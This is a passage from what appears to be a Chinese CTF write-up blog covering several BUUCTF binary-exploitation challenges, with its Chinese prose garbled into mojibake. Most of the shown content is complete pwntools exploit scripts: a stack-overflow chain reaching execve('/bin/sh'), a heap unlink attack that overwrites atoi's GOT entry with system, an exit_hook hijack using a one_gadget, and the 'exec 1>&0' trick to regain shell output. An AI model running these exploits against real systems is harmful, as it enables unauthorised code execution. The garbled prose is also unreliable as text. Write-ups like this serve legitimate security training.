é€’çš„readçš„å‚æ•°ï¼Œéƒ½æ˜¯æ¥è‡ªäºæ ˆä¸Šçš„ï¼Œè€Œä¸”éƒ½æ˜¯espå‰é¢çš„åœ°å€å­˜çš„å€¼ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬å°±æ˜¯æŒ‰ç…§å¹³å¸¸çš„å†™æ³•ï¼Œè¿”å›åœ°å€è¦†ç›–ä¸ºè¿™é‡Œçš„åœ°å€ï¼Œç„¶åå†å†™ä¸€ä¸ªæ–°çš„è¿”å›åœ°å€ï¼Œåé¢è·Ÿä¸Šreadçš„ä¸‰ä¸ªå‚æ•°<code>payload = &#39;a&#39;*0x20+p32(read)+p32(start)+p32(0)+p32(bss)+p32(8)</code></p><p>ç„¶åè¿”å›åˆ°æœ€åˆå†æ¬¡æ‰§è¡Œï¼Œå› ä¸ºæ‰§è¡Œå®Œå‡½æ•°çš„è¿”å›å€¼æ˜¯å­˜åœ¨eaxä¸­çš„ï¼Œæ‰€ä»¥ä¸ºäº†è¾¾æˆ0xbï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œreadå‡½æ•°æ—¶ï¼Œè¦è¾“å…¥0xbä¸ªæ•°æ®ï¼Œå› ä¸ºexecve(/bin/sh,0,0)ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒæ¬¡çš„è¿”å›åœ°å€è¦ç›´æ¥è¿”å›åˆ°readå‡½æ•°ä¼ å‚ï¼ˆæ­¤æ—¶eaxå·²ç»æ˜¯0xbäº†ï¼Œä¸èƒ½å†æ‰§è¡Œ0x804811Dï¼Œä¸ç„¶eaxçš„å€¼å°†ä¼šè¢«ä¿®æ”¹ï¼‰ï¼Œå› ä¸ºæ‰§è¡Œå®Œretåï¼Œespä¼šåŠ 4ï¼Œç§»åŠ¨åˆ°æˆ‘ä»¬æº¢å‡ºçš„p32(0)ï¼Œç„¶åä¼ å‚æ‰ä¼šæŠŠ/bin/shåœ°å€ä¼ å…¥åˆ°ebxä¸­ï¼Œè€Œ0x8048212è¿™ä¸ªåœ°å€ï¼Œåœ¨äºè¿™ä¸ªåœ°å€ä¸Šçš„å€¼å¿…é¡»æ˜¯0ï¼Œæ»¡è¶³è¿™ä¸ªè¦æ±‚å³å¯ï¼Œè¿™æ ·æ‰èƒ½æ»¡è¶³åç»­ä¼ å…¥çš„æ˜¯ä¸¤ä¸ª0</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831104312190.png" alt="image-20210831104312190"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,25785)</span><br>p = process(<span class="hljs-string">&quot;./warmup&quot;</span>)<br>bss = <span class="hljs-number">0x80491bc</span><br>start = <span class="hljs-number">0x080480D8</span><br>read = <span class="hljs-number">0x0804811D</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&#x27;2016!&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(start)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(read)+p32(<span class="hljs-number">0x08048122</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x8048212</span>)<br>p.send(payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">3</span>  )<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="åäº”ã€hitcontraining-unlink"><a href="#åäº”ã€hitcontraining-unlink" class="headerlink" title="åäº”ã€hitcontraining_unlink"></a>åäº”ã€hitcontraining_unlink</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831153526197.png" alt="image-20210831153526197"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œå¼€äº†NXï¼ŒCanary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831154605863.png" alt="image-20210831154605863"></p><p>è¿›å…¥IDAï¼Œå››ä¸ªèœå•åŠŸèƒ½éƒ½å…·å¤‡ï¼ŒåŒæ—¶è¿˜æ‰¾åˆ°ä¸ªåé—¨å‡½æ•°ï¼Œä½†æ˜¯çœ‹è·¯å¾„ï¼Œåº”è¯¥æ˜¯ç”¨ä¸äº†çš„ï¼Œbuuçš„flagå°±åœ¨æ ¹ç›®å½•ä¸‹çš„</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831155631822.png" alt="image-20210831155631822"></p><p>æ¼æ´ç‚¹åœ¨äºä¿®æ”¹å‡½æ•°é‡Œé¢ï¼Œå¯¹äºä¿®æ”¹çš„sizeæ²¡æœ‰æ£€æŸ¥ï¼Œå­˜åœ¨å †æº¢å‡º</p><p>ç”±äºåœ¨è¾“å…¥åä¼šåŠ 0æˆªæ–­ï¼Œå¹¶ä¸”æ²¡å¼€PIEï¼Œå †æŒ‡é’ˆç®€å•å¯å¯»ï¼Œæ‰€ä»¥è¿™é¢˜ç”¨unlinkåšã€‚ç›®æ ‡æ˜¯åŠ«æŒatoiçš„gotï¼Œ</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831202645476.png" alt="image-20210831202645476"></p><p>è¿™é‡Œæ˜¯è§¦å‘äº†unlinkï¼Œä¸‹ä¸€ä¸ªå¤§å°ä¸º0x80çš„å †å—ä¸æˆ‘ä»¬ä¼ªé€ çš„å¤§å°ä¸º0x40çš„å †å—åˆå¹¶æ”¾å…¥unsorted bin ä¸­</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203042925.png" alt="image-20210831203042925"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831203937694.png" alt="image-20210831203937694"></p><p>åŒæ—¶ï¼ŒæŒ‡å‘chunk0çš„æŒ‡é’ˆä¿å­˜çš„åœ°å€æ¢ä¸ºäº†ptr - 0x18çš„å€¼ï¼Œæ‰€ä»¥ï¼Œæ­¤æ—¶å¯ä»¥è®¤ä¸ºchunk0å˜æˆæ˜¯åœ¨ptr - 0x18çš„åœ°æ–¹äº†ã€‚æ‰€ä»¥æ­¤æ—¶å†æŠŠå †æŒ‡é’ˆæ”¹ä¸ºå‡½æ•°gotè¡¨åœ°å€ï¼Œä»è€Œæ³„éœ²libcåœ°å€</p><p>è€Œåˆšå¥½ï¼Œæ­¤æ—¶åˆæ˜¯atoiçš„gotè¡¨åœ°å€ï¼Œæ‰€ä»¥ç›´æ¥ç»§ç»­å¾€é‡Œé¢å†™å…¥systemçš„åœ°å€å³å¯ï¼Œæœ€åå†è¾“å…¥/bin/sh\x00å³å¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210831204445381.png" alt="image-20210831204445381"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25062</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;the name of item:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index of item:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;length of item name:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.recvuntil(<span class="hljs-string">&quot;the new name of the item:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;the index of item:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>ptr = <span class="hljs-number">0x00000000006020C8</span><br>add(<span class="hljs-number">0x40</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size size</span><br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0x40</span>) + p64(atoi_got)<br>edit(<span class="hljs-number">0</span>,payload)<br>show()<br>p.recvuntil(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] <br>log.success(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="åå…­ã€wustctf2020-closed"><a href="#åå…­ã€wustctf2020-closed" class="headerlink" title="åå…­ã€wustctf2020_closed"></a>åå…­ã€wustctf2020_closed</h2><p>è¿™é¢˜æ¯”è¾ƒæœ‰æ„æ€ï¼Œè®°å½•ä¸€ä¸‹ï¼Œè€ƒçš„æ˜¯linuxçš„åŸºç¡€çŸ¥è¯†</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152712612.png" alt="image-20210902152712612"></p><p>è¿›å…¥IDAï¼Œç¨‹åºååˆ†ç®€å•ï¼Œç”šè‡³ä¸»å‡½æ•°å·²ç»è¿è¡Œäº†system(â€œ/bin/shâ€)äº†ï¼Œä½†æ˜¯æ³¨æ„è¿™è¾¹æ‰§è¡Œäº†close(1)ä»¥åŠclose(2)ã€‚è¿™ä»£è¡¨ä»€ä¹ˆï¼Ÿä»£è¡¨å…³é—­äº†linuxé‡Œé¢çš„æ ‡å‡†è¾“å‡º(1)å’Œæ ‡å‡†é”™è¯¯(2)ï¼Œæ‰€ä»¥å³ä½¿å·²ç»getshelläº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜¯çœ‹ä¸åˆ°è¾“å‡ºçš„ï¼Œæ‰€ä»¥è¿™æ—¶å€™è¾“å…¥<code>exec 1&gt;&amp;0</code>å°±å¯ä»¥è®©æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ä¸º0ï¼Œè€Œ0æ²¡è¢«å…³é—­ï¼Œæ‰èƒ½çœ‹åˆ°è¾“å‡º</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152420434.png" alt="image-20210902152420434"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210902152447680.png" alt="image-20210902152447680"></p><h2 id="åä¸ƒã€ciscn-2019-n-7"><a href="#åä¸ƒã€ciscn-2019-n-7" class="headerlink" title="åä¸ƒã€ciscn_2019_n_7"></a>åä¸ƒã€ciscn_2019_n_7</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904105152457.png" alt="image-20210904105152457"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111520818.png" alt="image-20210904111520818"></p><p>è¿›å…¥IDAï¼Œåˆ†æç¨‹åºï¼Œé¦–å…ˆç¨‹åºä¸å­˜åœ¨é‡Šæ”¾åŠŸèƒ½ï¼Œå¹¶ä¸”å †å—åªèƒ½ç”Ÿæˆä¸€æ¬¡ï¼Œè¿™ç›´æ¥æ–­ç»äº†åŠ«æŒhookæŒ‡é’ˆçš„åšæ³•</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111633970.png" alt="image-20210904111633970"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111749218.png" alt="image-20210904111749218"></p><p>åœ¨addï¼Œeditå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ç¨‹åºä¸­çš„å †å—æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æ‹¥æœ‰äº†ä»»æ„å†™çš„èƒ½åŠ›</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904111836132.png" alt="image-20210904111836132"></p><p>å…¶æ¬¡åœ¨è¾“å…¥666åï¼Œç¨‹åºä¼šæ‰“å°å‡ºputsçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¹Ÿæ‹¥æœ‰äº†libcåœ°å€ï¼Œä¼¼ä¹ä¸€åˆ‡éƒ½å…·å¤‡äº†ï¼Ÿå°±å·®ä¸€ä¸ªå¯ä»¥è®©æˆ‘ä»¬ç›´æ¥å†™å…¥one_gadgetçš„åœ°æ–¹ã€‚å†™åœ¨å“ªï¼Ÿè¿™é‡Œä»‹ç»ä¸€ä¸ªæ–°çš„hookï¼Œexit_hookï¼Œåœ¨æ‰§è¡Œexitå‡½æ•°æ—¶ï¼Œä¼šæ‰§è¡Œåˆ°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯<code>_dl_rtld_lock_recursive</code>å’Œ<code>_dl_rtld_unlock_recursive</code>ï¼Œå…¶ä¸­ä¸€ä¸ªåŠ«æŒä¸ºone_gadgetéƒ½è¡Œï¼Œå¹¶ä¸”è¿™ä¸¤ä¸ªçš„åç§»æ˜¯å›ºå®šçš„å€¼</p><p>libc-2.23.so:</p><ul><li>rtld_lock = libc_base + 0x5F0F48</li><li>rtld_unlock = libc_base + 0x5F0F50</li></ul><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113624683.png" alt="image-20210904113624683"></p><p>åˆšå¥½å¾ˆå·§ï¼Œè¿™è¾¹æ‰§è¡Œåˆ°exitæ—¶ï¼Œä¹Ÿæ˜¯æŠŠæ–‡ä»¶æè¿°ç¬¦1å’Œ2å…³é—­äº†ï¼Œçœ‹ä¸è§è¾“å‡ºï¼Œæ‰€ä»¥è·Ÿä¸Šé¢˜ä¸€æ ·çš„å¤„ç†æ–¹å¼ï¼Œ<code>exec 1&gt;&amp;0</code>æ‰èƒ½çœ‹åˆ°äº¤äº’</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904113504655.png" alt="image-20210904113504655"></p><p>æˆåŠŸgetshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_7&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28496</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input string Length:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">name,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;New Author name:&quot;</span>)<br>p.send(name)<br>p.recvuntil(<span class="hljs-string">&quot;contents:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice-&gt;&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0xf1147</span><br>rtld_lock = libc_base + <span class="hljs-number">0x5F0F48</span><br>add(<span class="hljs-number">0x60</span>,p64(rtld_lock) * <span class="hljs-number">2</span>)<br>edit(p64(rtld_lock) * <span class="hljs-number">2</span>,p64(ogg))<br>exit()<br>p.sendline(<span class="hljs-string">&quot;exec 1&gt;&amp;0&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;ls&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="åä¹ã€ciscn-2019-es-4"><a href="#åä¹ã€ciscn-2019-es-4" class="headerlink" title="åä¹ã€ciscn_2019_es_4"></a>åä¹ã€ciscn_2019_es_4</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904121810292.png" alt="image-20210904121810292"></p><p>checksecä¸€ä¸‹ï¼Œ64ä½ï¼ŒPIEæ²¡å¼€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221627524.png" alt="image-20210904221627524"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221644339.png" alt="image-20210904221644339"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904221657542.png" alt="image-20210904221657542"></p><p>é¦–å…ˆæ¼æ´ç‚¹å­˜åœ¨editå‡½æ•°é‡Œé¢ï¼Œoffbynullï¼Œå…¶æ¬¡editå’Œshowå‡½æ•°ï¼Œéƒ½å­˜åœ¨éªŒè¯æ¬¡æ•°é—®é¢˜ï¼Œå¹¶ä¸”éªŒè¯çš„å€¼ä¿å­˜åœ¨.bssä¸Šï¼Œæ²¡å¼€PIEï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåº”è¯¥æ˜¯unlinkçš„é¢˜ï¼ŒæŠŠchunkæ”¹åˆ°.bssä¸Šï¼Œç„¶åä¿®æ”¹keyå€¼ã€‚ç„¶åç‰ˆæœ¬æ˜¯libc-2.27.soï¼Œå­˜åœ¨tcacheï¼Œæ‰€ä»¥åœ¨å‡chunkåº•ä¸‹é‚£ä¸ªchunkè¦é‡Šæ”¾ä¸ƒä¸ªç›¸åŒå¤§å°å»å¡«å……tcache bin</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904230122725.png" alt="image-20210904230122725"></p><p>unlinkæˆåŠŸï¼ŒæŠŠchunkçš„æŒ‡é’ˆè®¾ä¸º.bssä¸Šçš„å€¼</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231117920.png" alt="image-20210904231117920"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904231321497.png" alt="image-20210904231321497"></p><p>é€šè¿‡unlinkè®¾ç½®çš„æŒ‡é’ˆï¼ŒæŠŠå‰é¢ä¸¤ä¸ªä¿®æ”¹ä¸ºåŒä¸€ä¸ªå †åœ°å€ï¼Œå€Ÿæ­¤é€ æˆdouble freeï¼Œç„¶åæŠŠå †å—åˆ†é…åˆ°keyä¸Šï¼Œä¿®æ”¹keyå€¼ï¼Œè®©showåŠŸèƒ½æ¢å¤ä½¿ç”¨ï¼Œç„¶åé€šè¿‡showåŠŸèƒ½æ³„éœ²libcåœ°å€ã€‚ç„¶åå†æ¬¡ä½¿ç”¨unlinkè®¾ç½®å¥½çš„æŒ‡é’ˆï¼ŒæŠŠå‰é¢çš„å †å—æŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘free_hookï¼Œç„¶åé€šè¿‡editå‡½æ•°ï¼Œå¾€é‡Œé¢å†™å…¥systemå‡½æ•°ï¼Œä¹‹åfreeä¸€ä¸ªå†™æœ‰/bin/shçš„å †å—å³å¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210904234122710.png" alt="image-20210904234122710"></p><p>ç„¶åï¼Œè¿œç¨‹æ‰“æ—¶ï¼Œå †å—åœ°å€æ˜¯åªæœ‰å›¾ä¸­é‚£ä¹ˆé•¿çš„ï¼Œè¦æ³¨æ„ä¸€ä¸‹ã€‚ç„¶åå°±æ˜¯æˆ‘ä»¬æœ€åå¾€free_hookå†™å…¥systemçš„é‚£ä¸ªå †å—ï¼Œå¿…é¡»è¦åœ¨è¿™ä¹‹å‰æ˜¯è¢«ç”³è¯·å‡ºæ¥çš„ï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘åšçš„æ—¶å€™ä¸€ç›´å¡åœ¨è¿™æœ€åä¸€æ­¥ï¼Œæ²¡æƒ³é€šï¼Œç„¶åæ˜¯å¯¹ç…§åˆ«äººwpæ‰æ”¹äº†è¿™ä¸ªç‚¹ï¼Œç„¶åé€šäº†</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210905095712141.png" alt="image-20210905095712141"></p><p>getshellï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 